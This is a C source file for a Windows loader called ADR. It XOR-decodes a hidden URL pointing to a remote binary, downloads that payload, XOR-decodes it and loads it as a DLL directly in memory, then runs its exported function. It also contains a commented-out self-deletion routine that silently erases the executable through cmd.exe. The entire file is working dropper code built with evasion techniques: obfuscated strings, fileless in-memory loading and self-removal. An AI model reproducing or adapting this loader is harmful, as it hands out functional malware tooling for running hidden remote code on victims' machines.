#define _CRT_SECURE_NO_WARNINGS
#define _CRTDBG_MAP_ALLOC 

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <memory.h>

#include <windows.h>
#include <shlobj.h>

#ifdef _DEBUG or _DEBUG_EXE
#include <crtdbg.h>
#endif // _DEBUG or _DEBUG_EXE

#include "mem/memod.h"
#include "utils.h"


typedef int(CALLBACK* DLL_FUNCTION)();

#define ADR_XOR_KEY 'A'
#define ADR_XOR_LEN 50
// XOR_SIZE => 50 = 49 + 1 (\0 end of string)

#define ADR_XOR_URL                                                         \
  {                                                                         \
    0x29, 0x35, 0x35, 0x31, 0x32, 0x7b, 0x6e, 0x6e, 0x26, 0x28, 0x35, 0x29, \
        0x34, 0x23, 0x6f, 0x22, 0x2e, 0x2c, 0x6e, 0x2b, 0x34, 0x2d, 0x24,   \
        0x32, 0x26, 0x33, 0x22, 0x71, 0x6e, 0x00, 0x05, 0x13, 0x6e, 0x33,   \
        0x20, 0x36, 0x6e, 0x2c, 0x20, 0x28, 0x2f, 0x6e, 0x00, 0x05, 0x13,   \
        0x6f, 0x23, 0x28, 0x2f, 0x41                                        \
  }
// XOR => https://github.com/julesgrc0/ADR/raw/main/ADR.bin



bool GetPayload(const char* url, char** payload, size_t* payload_size)
{
  HINTERNET hInternet = hide_InternetOpenA("ADR", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
  if (hInternet == NULL) return false;

  HINTERNET hConnect = hide_InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
  if (hConnect == NULL)
  {
    hide_InternetCloseHandle(hInternet);
    return false;
  }

  const DWORD bufferSize = 8192;
  DWORD bytesRead = 0;
  DWORD totalBytesRead = 0;
  char* buffer = (char*)malloc(bufferSize);

  if (buffer == NULL)
  {
      hide_InternetCloseHandle(hConnect);
      hide_InternetCloseHandle(hInternet);
      return false;
  }

  size_t currentOffset = 0;
  char* tempPayload = NULL;

  while (hide_InternetReadFile(hConnect, buffer, bufferSize, &bytesRead) && bytesRead > 0)
  {
      tempPayload = (char*)realloc(tempPayload, totalBytesRead + bytesRead);
      if (tempPayload == NULL)
      {
          free(buffer);
          hide_InternetCloseHandle(hConnect);
          hide_InternetCloseHandle(hInternet);
          return false;
      }

      memcpy(tempPayload + currentOffset, buffer, bytesRead);
      currentOffset += bytesRead;
      totalBytesRead += bytesRead;
  }

  free(buffer);
  *payload = tempPayload;
  *payload_size = totalBytesRead;

  hide_InternetCloseHandle(hConnect);
  hide_InternetCloseHandle(hInternet);
  return true;
}

/*
bool SelfDelete()
{
    SHELLEXECUTEINFO sei;

    char szModule[MAX_PATH];
    char szComspec[MAX_PATH];
    char szParams[MAX_PATH];

    if ((GetModuleFileNameA(0, szModule, MAX_PATH) != 0) &&
        (GetShortPathNameA(szModule, szModule, MAX_PATH) != 0) &&
        (GetEnvironmentVariableA("COMSPEC", szComspec, MAX_PATH) != 0))
    {

        strcpy(szParams, "/c del ");
        strcat(szParams, szModule);
        strcat(szParams, " > nul");

        sei.cbSize = sizeof(sei);
        sei.hwnd = 0;
        sei.lpVerb = "Open";
        sei.lpFile = szComspec;
        sei.lpParameters = szParams;
        sei.lpDirectory = 0;
        sei.nShow = SW_HIDE;
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;

        SetPriorityClass(GetCurrentProcess(),
            REALTIME_PRIORITY_CLASS);
        SetThreadPriority(GetCurrentThread(),
            THREAD_PRIORITY_TIME_CRITICAL);

        if (ShellExecuteExA(&sei))
        {
            SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS);
            SetProcessPriorityBoost(sei.hProcess, TRUE);

            SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, szModule, 0);

            return true;
        }
        else
        {
            SetPriorityClass(GetCurrentProcess(),
                NORMAL_PRIORITY_CLASS);
            SetThreadPriority(GetCurrentThread(),
                THREAD_PRIORITY_NORMAL);
        }
    }
    return false;
}
*/

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ char* pCmdLine, _In_ int nCmdShow) 
{
#ifdef _DEBUG or _DEBUG_EXE
    _CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF);

    if (AllocConsole()) 
    {
        FILE* fDummy;
        freopen_s(&fDummy, "CONOUT$", "w", stdout);
        freopen_s(&fDummy, "CONOUT$", "w", stderr);
        freopen_s(&fDummy, "CONIN$", "r", stdin);

        fflush(stdout);
        fflush(stderr);
        fflush(stdin);
    }

    FILE* file = fopen("D:\\dev\\repos\\project\\software\\ADR\\x64\\Release\\ADR.bin", "rb");
    if (file == NULL) return EXIT_FAILURE;

    fseek(file, 0, SEEK_END);
    long payloadSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    char* payload = (char*)malloc(payloadSize);
    if (payload == NULL)
    {
        fclose(file);
        return EXIT_FAILURE;;
    }

    fread(payload, sizeof(char), payloadSize, file);
    fclose(file);
#else
  char url[ADR_XOR_LEN] = ADR_XOR_URL;
  DecodeXor(url, ADR_XOR_LEN, ADR_XOR_KEY);

  char* payload = (char*)malloc(0);
  size_t payloadSize = 0;

  if (!GetPayload(url, &payload, &payloadSize)) return EXIT_FAILURE;
#endif  // _DEBUG or _DEBUG_EXE

  DecodeXor(payload, payloadSize, ADR_XOR_KEY);
  
  HMEMORYMODULE handle = MemoryLoadLibrary(payload, payloadSize);
  if (!handle) return EXIT_FAILURE;
  free(payload);

  DLL_FUNCTION main = (DLL_FUNCTION)MemoryGetProcAddress(handle, "main");
  if (!main) return EXIT_FAILURE;

  main();

  MemoryFreeLibrary(handle);

#ifdef _DEBUG or _DEBUG_EXE
  _CrtDumpMemoryLeaks();
#endif // _DEBUG or _DEBUG_EXE

  //SelfDelete();
  return EXIT_SUCCESS;
}